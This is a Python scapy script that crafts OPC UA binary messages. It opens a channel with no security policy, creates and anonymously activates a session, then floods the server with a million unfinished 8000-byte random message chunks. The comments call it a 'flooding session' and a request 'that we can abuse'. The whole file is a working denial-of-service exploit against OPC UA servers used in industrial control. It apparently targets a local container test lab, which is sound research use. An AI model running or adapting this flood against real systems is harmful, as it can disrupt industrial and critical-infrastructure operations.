from scapy.all import *

from scapy.contrib.opcua_binary import (
    CommonParameter_RequestHeader,
    CommonParameter_ResponseHeader,
    OPC_UA_Binary,
    OPC_UA_Binary_Hello,
    OPC_UA_Binary_Message_ActivateSessionRequest,
    OPC_UA_Binary_Message_CreateSessionRequest,
    OPC_UA_Binary_Message_CreateSessionResponse,
    OPC_UA_Binary_Message_OpenSecureChannelRequest,
    OPC_UA_Binary_Message_OpenSecureChannelResponse,
    OPC_UA_Binary_Message_ReadRequest,
    OPC_UA_Binary_OpenSecureChannel,
    OPC_UA_Binary_SecureConversationMessage,
    OPC_UA_Binary_EncodableMessageObject,
    CustomParameter_LocaleId,
)


def send_OPC_HEL(
    ip: str,
    port: int,
    endpoint: str,
    show_payload: bool = False,
) -> SuperSocket:
    """
    Craft a new OPC Hello frame to start a conversation with a server.
    Returns the created socket for the chosen endpoint

    """

    # Can be used to craft multiple sessions?

    # use the scapy builtin supersockets for setting up the sockets
    conf.use_pcap = True
    s = socket.socket()
    s.connect((ip, port))
    ss = StreamSocket(s, Raw)

    # craft a hello package to open a new endpoint
    hello = OPC_UA_Binary() / OPC_UA_Binary_Hello()
    hello[OPC_UA_Binary_Hello].EndpointUri = endpoint
    hello[OPC_UA_Binary_Hello].EndpointUriSize = len(endpoint)
    hello[OPC_UA_Binary].MessageSize = len(hello)

    if show_payload:
        hello.show2()

    # emit payload
    ans = ss.sr1(Raw(hello))

    # show the crafted package
    if show_payload:
        OPC_UA_Binary(ans.load).show()

    return ss


def send_OPC_OpenSecureChannel(
    socket: SuperSocket,
    sequenceId: int,
    requestId: int,
    show_payload: bool = False,
) -> OPC_UA_Binary:
    """
    initiate a new connection

    """

    chanOpen = (
        OPC_UA_Binary()
        / OPC_UA_Binary_OpenSecureChannel()
        / OPC_UA_Binary_EncodableMessageObject()
        / OPC_UA_Binary_Message_OpenSecureChannelRequest()
    )

    chanOpen[CommonParameter_RequestHeader].NodeIdentifier_Numeric_4B = 446

    # we can only use policy none for the public stuff here
    policy = "http://opcfoundation.org/UA/SecurityPolicy#None"
    chanOpen[OPC_UA_Binary_OpenSecureChannel].SecurityPolicyUri = policy
    chanOpen[OPC_UA_Binary_OpenSecureChannel].SecurityPolicyUri_Size = len(policy)
    chanOpen[OPC_UA_Binary_OpenSecureChannel].SequenceNumber = sequenceId
    chanOpen[OPC_UA_Binary_OpenSecureChannel].RequestId = requestId
    chanOpen[OPC_UA_Binary].MessageSize = len(chanOpen)

    if show_payload:
        chanOpen.show2()

    # emit data
    ans = socket.sr1(Raw(chanOpen))

    if show_payload:
        OPC_UA_Binary(ans.load).show()

    return ans


def OPC_create_session(
    socket: SuperSocket,
    sequence_id: int,
    request_id: int,  # main OPC BIN header
    request_handle_Id: int,  # requestHeader id, can be different
    channel_id: int,
    token_id: int,
    target_endpoint: str,
    session_name: str,
    application_uri: str,
    product_uri: str,
    client_nonce: bytes,
    session_timeout: int,
    timestamp_start: int,
    show_payload: bool = False,
) -> OPC_UA_Binary:
    """
    request a new session handle from the server

    """

    # craft the main packet
    createSession = (
        OPC_UA_Binary()
        / OPC_UA_Binary_SecureConversationMessage()
        / OPC_UA_Binary_EncodableMessageObject()
        / OPC_UA_Binary_Message_CreateSessionRequest()
    )

    createSession[CommonParameter_RequestHeader].NodeIdentifier_Numeric_4B = 461

    # setup the main header (not length)
    createSession[OPC_UA_Binary_SecureConversationMessage].SequenceNumber = sequence_id
    createSession[OPC_UA_Binary_SecureConversationMessage].RequestId = request_id
    createSession[OPC_UA_Binary_SecureConversationMessage].SecureChannelId = channel_id
    createSession[OPC_UA_Binary_SecureConversationMessage].SecurityTokenId = token_id
    createSession[OPC_UA_Binary_SecureConversationMessage].TokenId = token_id

    request_header = CommonParameter_RequestHeader
    createSession[request_header].RequestHandle = request_handle_Id
    createSession[request_header].Timestamp = timestamp_start
    createSession[request_header].TimeoutHint = 4000

    sessionRequest = OPC_UA_Binary_Message_CreateSessionRequest
    createSession[sessionRequest].ApplicationUri = application_uri
    createSession[sessionRequest].ApplicationUri_Size = len(application_uri)
    createSession[sessionRequest].ProcuctUri = product_uri
    createSession[sessionRequest].ProcuctUri_Size = len(product_uri)
    createSession[sessionRequest].ApplicationType = "Client"
    createSession[sessionRequest].EndpointUrl = target_endpoint
    createSession[sessionRequest].EndpointUrl_Size = len(target_endpoint)
    createSession[sessionRequest].SessionName = session_name
    createSession[sessionRequest].SessionName_Size = len(session_name)

    # we need to set this up with a semi rand value, since NodeJS checks the nonce
    createSession[sessionRequest].ClientNonce = client_nonce
    createSession[sessionRequest].ClientNonce_Size = len(client_nonce)

    # we need to set the timeout, otherwise the server will timeout within 0.1s
    createSession[sessionRequest].RequestedSessionTimeout = session_timeout

    createSession[OPC_UA_Binary].MessageSize = len(createSession)

    if show_payload:
        createSession.show2()

    ans = socket.sr1(Raw(createSession))

    if show_payload:
        OPC_UA_Binary(ans.load).show()

    return ans


def OPC_activate_session(
    socket,
    sequence_id,
    request_id,
    request_handle_id,
    channel_id,
    token_id,
    timestamp_start,
    auth_token,
    show_payload: bool = False,
) -> OPC_UA_Binary:
    """
    pass the auth token from the initial session request to start a new user session

    """

    # craft the main message
    activateSession = (
        OPC_UA_Binary()
        / OPC_UA_Binary_SecureConversationMessage()
        / OPC_UA_Binary_EncodableMessageObject()
        / OPC_UA_Binary_Message_ActivateSessionRequest()
    )

    activateSession[CommonParameter_RequestHeader].NodeIdentifier_Numeric_4B = 467

    activateSession[OPC_UA_Binary_SecureConversationMessage].SequenceNumber = (
        sequence_id
    )
    activateSession[OPC_UA_Binary_SecureConversationMessage].RequestId = request_id
    activateSession[OPC_UA_Binary_SecureConversationMessage].SecureChannelId = (
        channel_id
    )
    activateSession[OPC_UA_Binary_SecureConversationMessage].SecurityTokenId = token_id
    activateSession[OPC_UA_Binary_SecureConversationMessage].TokenId = token_id

    requestHeader = CommonParameter_RequestHeader
    activateSession[requestHeader].RequestHandle = request_handle_id
    activateSession[requestHeader].Timestamp = timestamp_start
    activateSession[requestHeader].TimeoutHint = 4000

    # important: set the secret session id
    # node uses the string IDs:
    # Response_SessionId_NodeID_Mask= 0x4
    # Response_SessionId_NamespaceIndex_Default= 1
    # = 3d6cc2652777976d615dc0b892e27094

    activateSession[requestHeader].NodeID_Mask = 0x5
    activateSession[requestHeader].NodespaceIndex_Short = 0
    activateSession[requestHeader].NodeIdentifier_String_Size = len(auth_token)
    activateSession[requestHeader].NodeIdentifier_String = auth_token

    SessionRequest = OPC_UA_Binary_Message_ActivateSessionRequest

    # Client locale support
    # LocaleIds_ArraySize, default en
    activateSession[SessionRequest].LocaleIds_ArraySize = 1
    activateSession[SessionRequest].LocaleIds_Array = CustomParameter_LocaleId()

    # Client Signature support
    client_signature_algo = "http://www.w3.org/2000/09/xmldsig#rsa-sha1"
    # AnonymousIdentityToken_Encoding_DefaultBinary,321,Object
    activateSession[SessionRequest].ClientSignature.AlgorithmUri = client_signature_algo
    activateSession[SessionRequest].ClientSignature.AlgorithmUri_Size = len(
        client_signature_algo
    )

    # Construct UserIdentityToken = Anonymous
    policy = "anonymous"
    activateSession[SessionRequest].UserIdentityToken.Encoding = "ByteString"
    activateSession[SessionRequest].UserIdentityToken.Identifier_Numeric_4B = 321
    activateSession[SessionRequest].UserIdentityToken.EncodedData_Body_Size = (
        len(policy) + 4
    )
    activateSession[SessionRequest].UserIdentityToken.EncodedBody = policy
    activateSession[SessionRequest].UserIdentityToken.EncodedBody_Size = len(policy)

    activateSession[OPC_UA_Binary].MessageSize = len(activateSession)

    if show_payload:
        activateSession.show2()

    ans = socket.sr1(Raw(activateSession))

    if show_payload:
        OPC_UA_Binary(ans.load).show()

    return ans


def OPC_read_request(
    socket: SuperSocket,
    sequence_id: int,
    request_id: int,
    request_handle_id: int,
    channel_id: int,
    token_id: int,
    timestamp_start: int,
    auth_token: str,
    show_payload: bool = True,
) -> OPC_UA_Binary:

    readRequest = (
        OPC_UA_Binary()
        / OPC_UA_Binary_SecureConversationMessage()
        / OPC_UA_Binary_EncodableMessageObject()
        / OPC_UA_Binary_Message_ReadRequest()
    )

    readRequest[CommonParameter_RequestHeader].NodeIdentifier_Numeric_4B = 631

    protoHeader = OPC_UA_Binary_SecureConversationMessage
    readRequest[protoHeader].SequenceNumber = sequence_id
    readRequest[protoHeader].RequestId = request_id
    readRequest[protoHeader].SecureChannelId = channel_id
    readRequest[protoHeader].SecurityTokenId = token_id
    readRequest[protoHeader].TokenId = token_id

    header = CommonParameter_RequestHeader
    readRequest[header].RequestHandle = request_handle_id
    readRequest[header].Timestamp = timestamp_start
    readRequest[header].TimeoutHint = 4000

    # set the token/secret required for the service
    readRequest[header].NodeID_Mask = 0x5
    readRequest[header].NamespaceIndex_Short = 0
    readRequest[header].NodeIdentifier_String_Size = len(auth_token)
    readRequest[header].NodeIdentifier_String = auth_token

    # we do not need to send ids for reading, but we could
    # readRequest[OPC_UA_Binary_Message_ReadRequest].NodesToRead_ArraySize = 1
    # readRequest[OPC_UA_Binary_Message_ReadRequest].NodesToRead_Array = (
    #     CommonParameter_ReadValueId()
    # )

    readRequest[OPC_UA_Binary].MessageSize = len(readRequest)

    if show_payload:
        readRequest.show2()

    ans = socket.sr1(Raw(readRequest))

    if show_payload:
        OPC_UA_Binary(ans.load).show()

    return ans


def main():

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # 1: send HEL Message
    connection_endpoint = "opc.tcp://172.17.0.2:4840/"
    socket = send_OPC_HEL(
        "172.17.0.2",
        4840,
        connection_endpoint,
    )

    startSequence = 51
    startRequest = 1

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # 2: send OPN Message
    answer = send_OPC_OpenSecureChannel(
        socket,
        startSequence,
        startRequest,
        True,
    )

    startRequest += 1
    startSequence += 1

    # parse the answer packet, gives us the channel and token Ids
    opcbin_OSCR = OPC_UA_Binary_Message_OpenSecureChannelResponse
    res = OPC_UA_Binary(answer.load)
    channelId = res[opcbin_OSCR].SecureChannelId
    tokenId = res[opcbin_OSCR].TokenId
    ts = res[opcbin_OSCR].Timestamp

    opc_internal_endpoint = "opc.tcp://96721c15a93b:4840/KRITIS3M/"
    session_name = "flooding session"
    app_uri = "urn:freeopcua:client"
    prod_uri = "urn:freeopcua.github.io:client"
    nonce = random.randbytes(48)  # size: 32 < s < 128 Bit, nodejs checks this!
    startRequestHandle = 10000 + startRequest

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # request a new session handle from the server
    # with the handle we can call services and start user sessions
    answer = OPC_create_session(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_Id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        target_endpoint=opc_internal_endpoint,
        session_name=session_name,
        application_uri=app_uri,
        product_uri=prod_uri,
        session_timeout=0x0000000000F91541,  # about 36000
        client_nonce=nonce,
        timestamp_start=ts,
        show_payload=True,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1

    res = OPC_UA_Binary(answer.load)
    ts = res[CommonParameter_ResponseHeader].Timestamp + 100
    session_authToken = res[
        OPC_UA_Binary_Message_CreateSessionResponse
    ].ResponseAuthenticationToken.NodeIdentifier_String

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # open the session for requests
    answer = OPC_activate_session(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=True,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1

    res = OPC_UA_Binary(answer.load)
    ts = ts + 1000

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    # craft a new service request, that we can abuse

    answer = OPC_read_request(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=True,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1

    res = OPC_UA_Binary(answer.load)

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    # send a ton of useless data to a server and w8
    for x in range(1000000):
        random_payload_data = random.randbytes(8000)
        payload = (
            OPC_UA_Binary()
            / OPC_UA_Binary_SecureConversationMessage()
            / Raw(load=random_payload_data)
        )
        payload[OPC_UA_Binary_SecureConversationMessage].SequenceNumber = (
            startRequest + 50 + x
        )
        payload[OPC_UA_Binary_SecureConversationMessage].RequestId = startRequest
        payload[OPC_UA_Binary_SecureConversationMessage].SecureChannelId = channelId
        payload[OPC_UA_Binary_SecureConversationMessage].SecurityTokenId = tokenId
        payload[OPC_UA_Binary].ChunkType = b"C"  # set the chunk mark, but never finish
        payload[OPC_UA_Binary].MessageSize = len(payload)

        print(x)
        socket.send(Raw(payload))


if __name__ == "__main__":
    main()
